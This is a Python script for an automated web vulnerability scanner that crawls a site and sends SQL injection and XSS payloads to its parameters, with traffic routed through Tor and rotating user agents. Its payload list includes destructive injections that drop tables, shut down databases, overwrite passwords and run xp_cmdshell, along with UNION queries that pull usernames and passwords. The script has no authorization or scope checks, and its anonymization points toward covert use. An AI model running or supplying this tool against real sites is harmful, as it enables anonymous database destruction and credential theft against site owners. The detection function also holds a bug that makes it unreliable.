import requests
from bs4 import BeautifulSoup
import threading
import urllib.parse
from collections import deque
from urllib.parse import urlparse, parse_qs, urlencode
import time
import random
import socks
import socket
from stem import Signal
from stem.control import Controller
import os
from tqdm import tqdm
import logging
import sys
from datetime import datetime
import json
from typing import Dict, List, Tuple, Optional
import concurrent.futures
from urllib3.exceptions import InsecureRequestWarning
import ssl
import re
import argparse

# Suppress only the single warning from urllib3 needed.
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# Configure logging
def setup_logging():
    log_dir = "logs"
    if not os.path.exists(log_dir):
        os.makedirs(log_dir)
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    log_file = os.path.join(log_dir, f"scan_{timestamp}.log")
    
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s',
        handlers=[
            logging.FileHandler(log_file),
            logging.StreamHandler(sys.stdout)
        ]
    )
    return log_file

# Initialize logging
log_file = setup_logging()
logger = logging.getLogger(__name__)

# Configuration management
class Config:
    def __init__(self):
        self.config_file = "config.json"
        self.default_config = {
            "max_threads": 3,
            "max_retries": 3,
            "max_depth": 2,
            "timeout": 30,
            "delay_between_requests": 1,
            "verify_ssl": False,
            "rate_limit": {
                "requests_per_minute": 60,
                "burst_size": 10
            },
            "proxy": {
                "enabled": True,
                "tor_proxy": "socks5h://localhost:9050",
                "use_rotating_proxies": True
            },
            "scan_options": {
                "test_sqli": True,
                "test_xss": True,
                "test_path_traversal": False,
                "test_file_inclusion": False
            }
        }
        self.config = self.load_config()

    def load_config(self) -> dict:
        if os.path.exists(self.config_file):
            try:
                with open(self.config_file, 'r') as f:
                    user_config = json.load(f)
                    return {**self.default_config, **user_config}
            except json.JSONDecodeError:
                logger.error("Invalid config file. Using default configuration.")
                return self.default_config
        return self.default_config

    def save_config(self):
        with open(self.config_file, 'w') as f:
            json.dump(self.config, f, indent=4)

# Rate limiting
class RateLimiter:
    def __init__(self, requests_per_minute: int, burst_size: int):
        self.requests_per_minute = requests_per_minute
        self.burst_size = burst_size
        self.tokens = burst_size
        self.last_update = time.time()
        self.lock = threading.Lock()

    def acquire(self):
        with self.lock:
            now = time.time()
            time_passed = now - self.last_update
            self.tokens = min(
                self.burst_size,
                self.tokens + time_passed * (self.requests_per_minute / 60)
            )
            self.last_update = now

            if self.tokens >= 1:
                self.tokens -= 1
                return True
            return False

    def wait(self):
        while not self.acquire():
            time.sleep(0.1)

# Initialize configuration and rate limiter
config = Config()
rate_limiter = RateLimiter(
    config.config["rate_limit"]["requests_per_minute"],
    config.config["rate_limit"]["burst_size"]
)

vulnerability_results = {
    "sqli": {
        "error-based": [],
        "time-based": [],
        "boolean/union-based": []
    },
    "xss": []
}

# Configure Tor proxy
TOR_PROXY = "socks5h://localhost:9050"  # Use "socks5h" for DNS resolution through Tor

# Define vulnerability payloads
PAYLOADS = {
    "SQLi": [
        # Basic SQLi payloads
        "' OR '1'='1",
        "' OR 1=1 --",
        "' OR 'a'='a",
        "' OR 1=1#",
        "' OR '1'='1' --",
        "' OR '1'='1'#",
        "' OR 1=1; --",
        "' OR 1=1;#",
        # Error-based SQLi
        "' OR 1=CONVERT(int, (SELECT @@version)) --",
        "' OR 1/0 --",  # Division by zero
        "' OR @@version --",
        "' OR 'x'='x' AND EXTRACTVALUE(1, concat(0x7e,(SELECT @@version))) --",
        # Union-based SQLi
        "' UNION SELECT null, null --",
        "' UNION SELECT username, password FROM users --",
        "' UNION ALL SELECT null, null, null --",
        "' UNION SELECT 1, database(), version() --",
        "' UNION SELECT 1, user(), @@datadir --",
        "' ORDER BY 1 --",
        "' UNION SELECT 1,2,3 --",
        "' UNION SELECT 1, table_name, null FROM information_schema.tables --",
        "' UNION SELECT 1, column_name, null FROM information_schema.columns --",
        # Boolean-based Blind SQLi
        "' AND 1=1 --",
        "' AND 1=2 --",
        "' AND substring(database(),1,1)='a' --",
        "' AND (SELECT length(database()))=5 --",
        "' AND ascii(substring((SELECT database()),1,1))=97 --",
        "' AND 1=(SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END) --",
        "' AND 1=(SELECT CASE WHEN (1=2) THEN 1 ELSE 0 END) --",
        # Time-based Blind SQLi
        "' AND SLEEP(5) --",
        "' AND 1=IF(2>1,SLEEP(5),0) --",
        "' AND 1=IF(2<1,SLEEP(5),0) --",
        "' OR IF(1=1,SLEEP(5),0) --",
        "' AND BENCHMARK(1000000,MD5(1)) --",
        "' AND (SELECT * FROM (SELECT SLEEP(5))a) --",
        "' WAITFOR DELAY '0:0:5' --",  # MSSQL specific
        "' AND pg_sleep(5) --",  # PostgreSQL specific
        "' AND sleep(5)=0 --",  # MySQL specific
        # More advanced SQLi payloads
        "'; DROP TABLE users; --",
        "'; SHUTDOWN; --",
        "'; EXEC xp_cmdshell 'dir' --",  # MSSQL specific
        "' OR EXISTS(SELECT * FROM users) --",
        "' HAVING 1=1 --",
        "' GROUP BY 1 --",
        "' AND 1 in (SELECT @@version) --",
        "' OR (SELECT COUNT(*) FROM information_schema.tables) > 0 --",
        "' AND SUBSTRING((SELECT version()),1,1)='5' --",
        "' OR 1=(SELECT 1 FROM dual) --",  # Oracle specific
        # Escaped and encoded variations
        "'' OR ''1''=''1",
        "'%20OR%201=1--",
        "'+OR+1=1--",
        "') OR ('1'='1",
        "')) OR (('1'='1",
        # Multi-statement attempts
        "'; SELECT * FROM users; --",
        "'; UPDATE users SET password='hacked'; --",
        "'; INSERT INTO users (username, password) VALUES ('hacker', 'pass'); --",
        # Additional database-specific payloads
        "' OR sqlite_version() --",  # SQLite specific
        "' AND 1=cast('1' as int) --",  # Type conversion errors
        "' AND ROW_COUNT() > 0 --",  # MySQL specific
        "' OR 1=DBMS_UTILITY.SQLID_TO_SQLHASH('test') --"  # Oracle specific
    ],
    "XSS": [
        "<script>alert(1)</script>",
        "\"><img src=x onerror=alert(1)>"
    ]
}

# List of UserAgent headers
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
]

# Track tested URLs and parameters to avoid duplicates
tested_urls = set()

class SessionManager:
    def __init__(self):
        self.session = None
        self.last_rotation = time.time()
        self.rotation_interval = 300  # 5 minutes
        self.error_counts = {}  # Track error counts per URL
        self.lock = threading.Lock()

    def get_session(self) -> requests.Session:
        if self.session is None or time.time() - self.last_rotation > self.rotation_interval:
            self.session = self._create_session()
            self.last_rotation = time.time()
        return self.session

    def _create_session(self) -> requests.Session:
        session = requests.Session()
        
        # Configure proxy if enabled
        if config.config["proxy"]["enabled"]:
            session.proxies = {
                "http": config.config["proxy"]["tor_proxy"],
                "https": config.config["proxy"]["tor_proxy"]
            }
        
        # Configure SSL verification
        session.verify = config.config["verify_ssl"]
        
        # Configure retry strategy with exponential backoff
        retry_strategy = requests.adapters.Retry(
            total=config.config["max_retries"],
            backoff_factor=2,  # Exponential backoff
            status_forcelist=[429, 500, 502, 503, 504],
            allowed_methods=["GET", "POST", "HEAD", "OPTIONS"],
            respect_retry_after_header=True
        )
        adapter = requests.adapters.HTTPAdapter(max_retries=retry_strategy)
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        
        return session

    def should_skip_url(self, url: str) -> bool:
        """Check if URL should be skipped due to too many errors."""
        with self.lock:
            if url in self.error_counts and self.error_counts[url] >= 5:
                return True
            return False

    def increment_error_count(self, url: str):
        """Increment error count for a URL."""
        with self.lock:
            if url not in self.error_counts:
                self.error_counts[url] = 0
            self.error_counts[url] += 1

    def rotate_proxy(self):
        if config.config["proxy"]["enabled"] and config.config["proxy"]["use_rotating_proxies"]:
            try:
                with Controller.from_port(port=9051) as controller:
                    controller.authenticate()
                    controller.signal(Signal.NEWNYM)
                logger.info("Successfully rotated Tor circuit")
            except Exception as e:
                logger.error(f"Failed to rotate Tor circuit: {e}")

session_manager = SessionManager()

def get_random_user_agent() -> str:
    """Return a random User-Agent string."""
    return random.choice(USER_AGENTS)

def make_request(url: str, method: str = "GET", **kwargs) -> Optional[requests.Response]:
    """Make an HTTP request with rate limiting and error handling."""
    if session_manager.should_skip_url(url):
        logger.warning(f"Skipping {url} due to too many errors")
        return None

    rate_limiter.wait()
    session = session_manager.get_session()
    
    try:
        if "headers" not in kwargs:
            kwargs["headers"] = {}
        kwargs["headers"]["User-Agent"] = get_random_user_agent()
        kwargs["timeout"] = config.config["timeout"]
        
        response = session.request(method, url, **kwargs)
        response.raise_for_status()
        return response
    except requests.exceptions.RequestException as e:
        session_manager.increment_error_count(url)
        logger.error(f"Request failed for {url}: {e}")
        return None

def crawl(start_url: str, max_depth: int = 2) -> List[str]:
    """Crawl the website to find all internal links with improved error handling."""
    visited = set()
    queue = deque([(start_url, 0)])
    links = []
    session = session_manager.get_session()
    
    with tqdm(desc="Crawling URLs", unit="url") as pbar:
        while queue:
            url, depth = queue.popleft()
            if url in visited or depth > max_depth:
                continue
            visited.add(url)
            
            try:
                response = make_request(url)
                if not response:
                    continue
                    
                soup = BeautifulSoup(response.text, 'html.parser')
                for link in soup.find_all('a', href=True):
                    full_url = urllib.parse.urljoin(url, link['href'])
                    if full_url.startswith(start_url) and full_url not in visited:
                        queue.append((full_url, depth + 1))
                        links.append(full_url)
                        logger.debug(f"Found link: {full_url}")
            except Exception as e:
                logger.error(f"Failed to crawl {url}: {e}")
            finally:
                pbar.update(1)
    
    return links

def get_baseline_response(url, session, headers):
    """Fetch the original response for comparison."""
    try:
        response = session.get(url, headers=headers, timeout=30)
        return {
            "status_code": response.status_code,
            "content": response.text,
            "length": len(response.text)
        }
    except requests.RequestException as e:
        print(f"[ERROR] Failed to get baseline for {url}: {e}")
        return None

def is_vulnerable(baseline: Optional[Dict], response: requests.Response, elapsed_time: float, payload: str) -> Optional[str]:
    """Check if the response indicates a vulnerability with improved detection."""
    if not response:
        return None

    content = response.text.lower()
    status_code = response.status_code
    
    # SQL Injection detection patterns
    sql_errors = {
        "sql syntax": "SQL syntax error",
        "mysql_fetch": "MySQL fetch error",
        "syntax error": "Syntax error",
        "unexpected token": "Unexpected token",
        "error in your sql": "SQL error",
        "warning: mysql": "MySQL warning",
        "oracle error": "Oracle error",
        "postgresql error": "PostgreSQL error",
        "sqlite error": "SQLite error",
        "mssql error": "MSSQL error"
    }
    
    # XSS detection patterns
    xss_patterns = [
        r"<script>.*?</script>",
        r"javascript:.*?",
        r"onerror=.*?",
        r"onload=.*?",
        r"onclick=.*?"
    ]

    # Check for SQL Injection vulnerabilities
    if any(error in content for error in sql_errors.keys()):
        logger.info(f"Found SQL error: {sql_errors[error]}")
        return "error-based"

    # Time-based detection
    if "SLEEP" in payload.upper() and elapsed_time > 5:
        logger.info(f"Time-based vulnerability detected with {elapsed_time}s delay")
        return "time-based"

    # Boolean/Union-based detection
    if baseline and status_code == 200:
        baseline_len = baseline["length"]
        response_len = len(response.text)
        content_diff = abs(response_len - baseline_len)
        
        # Check for significant content changes
        if response_len > baseline_len * 1.5 or (response_len > baseline_len and "SELECT" in payload.upper()):
            logger.info(f"Content length changed from {baseline_len} to {response_len}")
            return "boolean/union-based"
        
        # Check for specific SQL keywords in response
        sql_keywords = ["select", "union", "from", "where", "and", "or", "order by", "group by"]
        if any(keyword in content for keyword in sql_keywords):
            logger.info("Found SQL keywords in response")
            return "boolean/union-based"

    # XSS detection
    if any(re.search(pattern, content, re.IGNORECASE) for pattern in xss_patterns):
        logger.info("Found XSS pattern in response")
        return "xss"

    return None

def test_sqli(url):
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)
    session = session_manager.get_session()
    headers = {"User-Agent": get_random_user_agent()}
    baseline = get_baseline_response(url, session, headers) if query_params else None

    if query_params:
        for param in query_params:
            for payload in PAYLOADS["SQLi"]:
                test_params = query_params.copy()
                test_params[param] = payload
                test_url = parsed_url._replace(query=urlencode(test_params, doseq=True)).geturl()
                if test_url in tested_urls:
                    continue
                tested_urls.add(test_url)
                for attempt in range(config.config["max_retries"]):
                    try:
                        start_time = time.time()
                        response = session.get(test_url, headers=headers, timeout=30)
                        elapsed_time = time.time() - start_time
                        vuln_type = is_vulnerable(baseline, response, elapsed_time, payload)
                        if vuln_type:
                            logger.info(f"{vuln_type.capitalize()} SQLi vulnerability found in {param} at {test_url}")
                            vulnerability_results["sqli"][vuln_type].append((test_url, param))  # Store result
                            break
                    except requests.RequestException as e:
                        logger.error(f"Attempt {attempt + 1} failed for {test_url}: {e}")
                        if attempt < config.config["max_retries"] - 1:
                            time.sleep(random.uniform(1, 5))
                        else:
                            logger.error(f"Max retries reached for {test_url}")
    else:
        for payload in PAYLOADS["SQLi"]:
            test_url = f"{url}/{payload}"
            if test_url in tested_urls:
                continue
            tested_urls.add(test_url)
            for attempt in range(config.config["max_retries"]):
                try:
                    start_time = time.time()
                    response = session.get(test_url, headers=headers, timeout=30)
                    elapsed_time = time.time() - start_time
                    vuln_type = is_vulnerable(None, response, elapsed_time, payload)
                    if vuln_type:
                        logger.info(f"{vuln_type.capitalize()} SQLi vulnerability found in path at {test_url}")
                        vulnerability_results["sqli"][vuln_type].append((test_url, "path"))  # Store result
                        break
                except requests.RequestException as e:
                    logger.error(f"Attempt {attempt + 1} failed for {test_url}: {e}")
                    if attempt < config.config["max_retries"] - 1:
                        time.sleep(random.uniform(1, 5))
                    else:
                        logger.error(f"Max retries reached for {test_url}")

def test_xss(url):
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)
    session = session_manager.get_session()
    
    if query_params:
        for param in query_params:
            for payload in PAYLOADS["XSS"]:
                test_params = query_params.copy()
                test_params[param] = payload
                test_url = parsed_url._replace(query=urlencode(test_params, doseq=True)).geturl()
                if test_url in tested_urls:
                    continue
                tested_urls.add(test_url)
                for attempt in range(config.config["max_retries"]):
                    try:
                        headers = {"User-Agent": get_random_user_agent()}
                        response = session.get(test_url, headers=headers, timeout=30)
                        if payload in response.text:
                            logger.info(f"XSS vulnerability found in {param} at {test_url}")
                            vulnerability_results["xss"].append((test_url, param))  # Store result
                            break
                    except requests.RequestException as e:
                        logger.error(f"Attempt {attempt + 1} failed for {test_url}: {e}")
                        if attempt < config.config["max_retries"] - 1:
                            time.sleep(random.uniform(1, 5))
                        else:
                            logger.error(f"Max retries reached for {test_url}")
    else:
        for payload in PAYLOADS["XSS"]:
            test_url = f"{url}/{payload}"
            if test_url in tested_urls:
                continue
            tested_urls.add(test_url)
            for attempt in range(config.config["max_retries"]):
                try:
                    headers = {"User-Agent": get_random_user_agent()}
                    response = session.get(test_url, headers=headers, timeout=30)
                    if payload in response.text:
                        logger.info(f"XSS vulnerability found in path at {test_url}")
                        vulnerability_results["xss"].append((test_url, "path"))  # Store result
                        break
                except requests.RequestException as e:
                    logger.error(f"Attempt {attempt + 1} failed for {test_url}: {e}")
                    if attempt < config.config["max_retries"] - 1:
                        time.sleep(random.uniform(1, 5))
                    else:
                        logger.error(f"Max retries reached for {test_url}")

def generate_html_report(website_name: str):
    """Generate an improved HTML report with more details and better styling."""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    report_file = f"reports/{website_name}_report_{timestamp}.html"
    
    # Create reports directory if it doesn't exist
    os.makedirs("reports", exist_ok=True)
    
    # Calculate statistics
    total_vulns = sum(len(vulns) for vulns in vulnerability_results["sqli"].values()) + len(vulnerability_results["xss"])
    vuln_types = {
        "SQLi": sum(len(vulns) for vulns in vulnerability_results["sqli"].values()),
        "XSS": len(vulnerability_results["xss"])
    }
    
    html_content = f"""
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Security Scan Report - {website_name}</title>
        <style>
            body {{
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                line-height: 1.6;
                margin: 0;
                padding: 20px;
                background-color: #f5f5f5;
            }}
            .container {{
                max-width: 1200px;
                margin: 0 auto;
                background-color: white;
                padding: 20px;
                border-radius: 8px;
                box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            }}
            .header {{
                text-align: center;
                margin-bottom: 30px;
                padding-bottom: 20px;
                border-bottom: 2px solid #eee;
            }}
            .stats {{
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
                gap: 20px;
                margin-bottom: 30px;
            }}
            .stat-card {{
                background-color: #fff;
                padding: 20px;
                border-radius: 8px;
                box-shadow: 0 2px 4px rgba(0,0,0,0.1);
                text-align: center;
            }}
            .stat-number {{
                font-size: 2em;
                font-weight: bold;
                color: #2196F3;
            }}
            .vulnerability-section {{
                margin-bottom: 30px;
            }}
            .vuln-header {{
                background-color: #2196F3;
                color: white;
                padding: 10px 20px;
                border-radius: 4px;
                margin-bottom: 15px;
            }}
            .vuln-list {{
                list-style: none;
                padding: 0;
            }}
            .vuln-item {{
                background-color: #f8f9fa;
                padding: 15px;
                margin-bottom: 10px;
                border-radius: 4px;
                border-left: 4px solid #2196F3;
            }}
            .vuln-url {{
                color: #2196F3;
                text-decoration: none;
                word-break: break-all;
            }}
            .vuln-param {{
                color: #666;
                font-size: 0.9em;
            }}
            .no-vulns {{
                color: #666;
                font-style: italic;
                text-align: center;
                padding: 20px;
            }}
            .timestamp {{
                text-align: right;
                color: #666;
                font-size: 0.9em;
                margin-top: 20px;
            }}
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>Security Scan Report</h1>
                <h2>{website_name}</h2>
            </div>
            
            <div class="stats">
                <div class="stat-card">
                    <div class="stat-number">{total_vulns}</div>
                    <div>Total Vulnerabilities</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number">{vuln_types['SQLi']}</div>
                    <div>SQL Injection</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number">{vuln_types['XSS']}</div>
                    <div>XSS Vulnerabilities</div>
                </div>
            </div>
            
            <div class="vulnerability-section">
                <h2 class="vuln-header">SQL Injection Vulnerabilities</h2>
                <div class="vuln-list">
    """
    
    # Add SQL Injection vulnerabilities
    for vuln_type, vulns in vulnerability_results["sqli"].items():
        html_content += f"<h3>{vuln_type.replace('-', ' ').title()}</h3>"
        if vulns:
            for url, param in vulns:
                html_content += f"""
                    <div class="vuln-item">
                        <a href="{url}" class="vuln-url" target="_blank">{url}</a>
                        <div class="vuln-param">Parameter: {param}</div>
                    </div>
                """
        else:
            html_content += '<div class="no-vulns">No vulnerabilities found</div>'
    
    # Add XSS vulnerabilities
    html_content += """
                </div>
                <h2 class="vuln-header">XSS Vulnerabilities</h2>
                <div class="vuln-list">
    """
    
    if vulnerability_results["xss"]:
        for url, param in vulnerability_results["xss"]:
            html_content += f"""
                <div class="vuln-item">
                    <a href="{url}" class="vuln-url" target="_blank">{url}</a>
                    <div class="vuln-param">Parameter: {param}</div>
                </div>
            """
    else:
        html_content += '<div class="no-vulns">No vulnerabilities found</div>'
    
    html_content += f"""
                </div>
            </div>
            <div class="timestamp">
                Generated on: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
            </div>
        </div>
    </body>
    </html>
    """
    
    with open(report_file, 'w', encoding='utf-8') as f:
        f.write(html_content)
    
    logger.info(f"Generated HTML report: {report_file}")
    return report_file

def test_links(links: List[str]):
    """Test vulnerabilities in all crawled links with improved threading."""
    stop_event = threading.Event()
    
    def signal_handler(signum, frame):
        logger.info("Received interrupt signal. Cleaning up...")
        stop_event.set()
    
    # Register signal handlers
    import signal
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=config.config["max_threads"]) as executor:
        futures = []
        for url in links:
            if stop_event.is_set():
                break
                
            if config.config["scan_options"]["test_sqli"]:
                futures.append(executor.submit(test_sqli, url))
            if config.config["scan_options"]["test_xss"]:
                futures.append(executor.submit(test_xss, url))
        
        with tqdm(total=len(futures), desc="Testing URLs", unit="url") as pbar:
            for future in concurrent.futures.as_completed(futures):
                if stop_event.is_set():
                    # Cancel remaining futures
                    for f in futures:
                        f.cancel()
                    break
                    
                try:
                    future.result()
                except Exception as e:
                    logger.error(f"Error during vulnerability testing: {e}")
                pbar.update(1)

def save_urls_to_file(urls: List[str], website_name: str) -> str:
    """Save URLs to a text file named after the website."""
    filename = f"urls/{website_name}_urls.txt"
    os.makedirs("urls", exist_ok=True)
    
    with open(filename, 'w', encoding='utf-8') as f:
        for url in urls:
            f.write(f"{url}\n")
    logger.info(f"Saved {len(urls)} URLs to {filename}")
    return filename

def load_urls_from_file(filename: str) -> List[str]:
    """Load URLs from a text file."""
    if not os.path.exists(filename):
        logger.error(f"File {filename} not found!")
        return []
    with open(filename, 'r', encoding='utf-8') as f:
        urls = [line.strip() for line in f if line.strip()]
    logger.info(f"Loaded {len(urls)} URLs from {filename}")
    return urls

def main():
    """Main function with command-line argument support."""
    parser = argparse.ArgumentParser(description='Web Application Vulnerability Scanner')
    parser.add_argument('--url', help='URL to scan')
    parser.add_argument('--file', help='File containing URLs to scan')
    parser.add_argument('--depth', type=int, default=2, help='Maximum crawl depth')
    parser.add_argument('--threads', type=int, help='Number of concurrent threads')
    parser.add_argument('--no-tor', action='store_true', help='Disable Tor proxy')
    parser.add_argument('--verify-ssl', action='store_true', help='Enable SSL verification')
    parser.add_argument('--output-dir', help='Directory for output files')
    parser.add_argument('--max-errors', type=int, default=5, help='Maximum number of errors per URL before skipping')
    
    args = parser.parse_args()
    
    # Update configuration based on command-line arguments
    if args.threads:
        config.config["max_threads"] = args.threads
    if args.no_tor:
        config.config["proxy"]["enabled"] = False
    if args.verify_ssl:
        config.config["verify_ssl"] = True
    if args.output_dir:
        os.makedirs(args.output_dir, exist_ok=True)
    
    try:
        if args.url:
            url = args.url
            if not url.startswith(("http://", "https://")):
                url = "http://" + url
            website_name = urlparse(url).netloc.replace('.', '_')
            logger.info(f"Starting new scan for {url}")
            
            links = crawl(url, args.depth)
            logger.info(f"Found {len(links)} links")
            
            if links:
                save_urls_to_file(links, website_name)
                test_links(links)
                report_file = generate_html_report(website_name)
                logger.info(f"Scan completed. Report saved to: {report_file}")
            else:
                logger.warning("No links found to test")
                
        elif args.file:
            links = load_urls_from_file(args.file)
            if links:
                website_name = os.path.splitext(os.path.basename(args.file))[0]
                logger.info(f"Testing {len(links)} loaded links")
                test_links(links)
                report_file = generate_html_report(website_name)
                logger.info(f"Scan completed. Report saved to: {report_file}")
            else:
                logger.error("No links to test. Please check the file or start a new scan with --url")
        else:
            parser.print_help()
            
    except KeyboardInterrupt:
        logger.info("Scan interrupted by user")
    except Exception as e:
        logger.error(f"An error occurred: {e}")
        raise
    finally:
        # Cleanup
        if 'session_manager' in globals():
            session_manager.rotate_proxy()  # Rotate proxy one last time
        logger.info("Scan finished")

if __name__ == "__main__":
    main()